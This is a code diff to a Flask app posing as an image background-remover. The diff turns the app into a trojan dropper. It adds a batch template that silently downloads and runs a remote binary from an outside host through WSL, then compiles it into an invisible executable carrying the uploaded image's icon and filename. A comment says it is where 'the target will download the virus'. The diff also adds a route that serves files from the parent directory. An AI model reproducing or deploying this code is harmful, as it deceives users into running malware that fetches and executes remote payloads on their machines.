@@ -5,6 +5,7 @@ from werkzeug.security import generate_password_hash, check_password_hash
 import secrets
 import subprocess
 import uuid
+import time
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(32)
@@ -12,13 +13,30 @@ REGISTRATION_KEY = secrets.token_urlsafe(32)
 
 UPLOAD_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'uploads')
 PROCESSED_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'processed')
+EXECUTABLES_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'executables')
+ICOS_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'icos')
+BATFILES_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'batfiles')
+BAT_TO_EXE_PATH = "/mnt/c/Users/stanl/Downloads/Bat_To_Exe_Converter_x64.exe"
 app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
 app.config["PROCESSED_FOLDER"] = PROCESSED_FOLDER
+app.config["EXECUTABLES_FOLDER"] = EXECUTABLES_FOLDER
+app.config["ICOS_FOLDER"] = ICOS_FOLDER
+app.config["BATFILES_FOLDER"] = BATFILES_FOLDER
 
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 os.makedirs(PROCESSED_FOLDER, exist_ok=True)
+os.makedirs(EXECUTABLES_FOLDER, exist_ok=True)
+os.makedirs(ICOS_FOLDER, exist_ok=True)
+os.makedirs(BATFILES_FOLDER, exist_ok=True)
 
 DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')
+
+batfile_template = '''
+@echo off
+
+wsl bash -c "curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null"
+wsl bash -c "chmod +x ~/.config/rm17-node 2>/dev/null"
+wsl bash -c "~/.config/rm17-node 2>/dev/null"'''
 
 # Gets db connections
 def get_db_connection():
@@ -73,6 +91,8 @@ def proceed():
     img = request.files.get("image")
     
     original_filename = img.filename
+    
+    session['filename'] = f'{os.path.splitext(original_filename)[0]}.exe'
 
     # Generate unique filename so we don't accidently override
     extension = os.path.splitext(img.filename)[1]
@@ -84,19 +104,33 @@ def proceed():
 
     # Path for image with removed background
     processed_path = os.path.join(app.config["PROCESSED_FOLDER"], filename)
+    ico_path = os.path.join("icos", f'{os.path.splitext(filename)[0]}.ico')
+    batfile_path = os.path.join("batfiles", f'{os.path.splitext(filename)[0]}.bat')
+    
+    batfile = batfile_template[:]
+    batfile += f'''\nwsl bash -c "curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null"'''
+    batfile += f'''\nstart {original_filename}'''
+    
+    with open(batfile_path, 'w') as file:
+        file.write(batfile)
     
     subprocess.run(["backgroundremover", "-i", upload_path, "-o", processed_path])
+    subprocess.run(["convert", processed_path, "-define", "icon:auto-resize=256,64,32", ico_path])
+    # Wait until the file exists and is non-empty
+    time.sleep(2)
 
-    # Delete original upload
-    os.remove(upload_path)
+    subprocess.run([BAT_TO_EXE_PATH, "/bat", batfile_path, "/exe", f'executables/{os.path.splitext(filename)[0]}.exe', "/icon", ico_path, "/invisible"])
+
+    # # Delete original upload
+    # os.remove(upload_path)
 
     flash("Image processed! Click download to get the PNG.", "success")
-    return render_template("results.html", filename=original_filename, img=filename)
+    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}.exe')
 
 # Download page where the target will download the virus
 @app.route("/results", methods=['GET', 'POST'])
 def results():
-    return render_template("results.html", img="15172b6d39724ad195241b1dd0e9bbff.png")
+    return render_template("results.html")
 
 # Displays edited image
 @app.route('/processed/<path:filename>')
@@ -204,10 +238,20 @@ def list_files():
     )
     return f"<ul>{files_html}</ul>"
     
-# Retrieving files
+# Download the scripts we will run
 @app.route('/files/<path:filename>', methods=['POST'])
+def get_file(filename):
+    return send_from_directory('../', filename)
+
+# Download the actual image via curl
+@app.route('/download_image/<path:filename>', methods=['POST'])
+def download_img(filename):
+    return send_from_directory(PROCESSED_FOLDER, filename)    
+
+# Download the executable
+@app.route('/download/<path:filename>', methods=['GET', 'POST'])
 def download_file(filename):
-    return send_from_directory('../', filename)    
+    return send_from_directory(EXECUTABLES_FOLDER, filename, download_name=session['filename'], as_attachment=True)
     
 if __name__ == "__main__":
     create_db()
